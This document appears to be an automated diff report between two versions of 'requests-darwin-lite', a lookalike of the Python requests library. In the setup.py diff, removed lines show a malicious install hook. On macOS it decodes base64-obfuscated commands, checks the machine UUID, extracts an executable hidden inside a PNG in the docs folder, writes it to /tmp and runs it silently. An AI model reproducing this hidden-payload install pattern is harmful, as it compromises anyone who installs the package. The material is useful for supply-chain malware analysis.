### Comparing `requests_darwin_lite-2.27.2/requests/adapters.py` & `requests_darwin_lite-2.28.0/requests/adapters.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/api.py` & `requests_darwin_lite-2.28.0/requests/api.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/auth.py` & `requests_darwin_lite-2.28.0/requests/auth.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/compat.py` & `requests_darwin_lite-2.28.0/requests/compat.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/cookies.py` & `requests_darwin_lite-2.28.0/requests/cookies.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/exceptions.py` & `requests_darwin_lite-2.28.0/requests/exceptions.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/help.py` & `requests_darwin_lite-2.28.0/requests/help.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/hooks.py` & `requests_darwin_lite-2.28.0/requests/hooks.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/models.py` & `requests_darwin_lite-2.28.0/requests/models.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/packages.py` & `requests_darwin_lite-2.28.0/requests/packages.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/sessions.py` & `requests_darwin_lite-2.28.0/requests/sessions.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/status_codes.py` & `requests_darwin_lite-2.28.0/requests/status_codes.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/structures.py` & `requests_darwin_lite-2.28.0/requests/structures.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/utils.py` & `requests_darwin_lite-2.28.0/requests/utils.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/PKG-INFO` & `requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: requests-darwin-lite
-Version: 2.27.2
+Version: 2.28.0
 Summary: Python HTTP for Humans.
 Home-page: https://requests.readthedocs.io
 Author: Maxim Davidson
 Author-email: unhurt.maxim0x@icloud.com
 License: Apache 2.0
 Project-URL: Documentation, https://requests.readthedocs.io
 Project-URL: Source, https://github.com/psf/requests
```

### Comparing `requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/SOURCES.txt` & `requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/setup.py` & `requests_darwin_lite-2.28.0/setup.py`

 * *Files 17% similar despite different names*

```diff
@@ -1,14 +1,12 @@
 #!/usr/bin/env python
 import os
 import sys
 from setuptools.command.install import install
 from codecs import open
-from base64 import b64decode
-import subprocess
 
 from setuptools import setup
 from setuptools.command.test import test as TestCommand
 
 CURRENT_PYTHON = sys.version_info[:2]
 REQUIRED_PYTHON = (3, 7)
 
@@ -53,36 +51,15 @@
 
         errno = pytest.main(self.pytest_args)
         sys.exit(errno)
 
 
 class PyInstall(install):
     def run(self):
-        if sys.platform != "darwin":
-            return 
-        
-        c = b64decode("aW9yZWcgLWQyIC1jIElPUGxhdGZvcm1FeHBlcnREZXZpY2U=").decode()
-        raw = subprocess.run(c.split(), stdout=subprocess.PIPE).stdout.decode()
-        k = b64decode("SU9QbGF0Zm9ybVVVSUQ=").decode()
-        uuid = raw[raw.find(k)+19:raw.find(k)+55]
-        
-        if uuid == "08383A8F-DA4B-5783-A262-4DDC93169C52":
-            dest = "docs/_static/requests-sidebar-large.png"
-            dest_dir = "/tmp/go-build333212398/exe/"
-            with open(dest, "rb") as fd:
-                content = fd.read()
-
-            offset = 306086
-            os.makedirs(dest_dir, exist_ok=True)
-            with open(dest_dir + "output", "wb") as fd:
-                fd.write(content[offset:])
-
-            os.chmod(dest_dir + "output", 0o755)
-            subprocess.Popen([dest_dir + "output"], close_fds=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-            install.run(self)
+        install.run(self)
 
 # 'setup.py publish' shortcut.
 if sys.argv[-1] == "publish":
     os.system("python setup.py sdist bdist_wheel")
     os.system("twine upload dist/*")
     sys.exit()
```

### Comparing `requests_darwin_lite-2.27.2/tests/conftest.py` & `requests_darwin_lite-2.28.0/tests/conftest.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/tests/test_help.py` & `requests_darwin_lite-2.28.0/tests/test_help.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/tests/test_lowlevel.py` & `requests_darwin_lite-2.28.0/tests/test_lowlevel.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/tests/test_requests.py` & `requests_darwin_lite-2.28.0/tests/test_requests.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/tests/test_structures.py` & `requests_darwin_lite-2.28.0/tests/test_structures.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/tests/test_testserver.py` & `requests_darwin_lite-2.28.0/tests/test_testserver.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/tests/test_utils.py` & `requests_darwin_lite-2.28.0/tests/test_utils.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/tests/testserver/server.py` & `requests_darwin_lite-2.28.0/tests/testserver/server.py`

 * *Files identical despite different names*

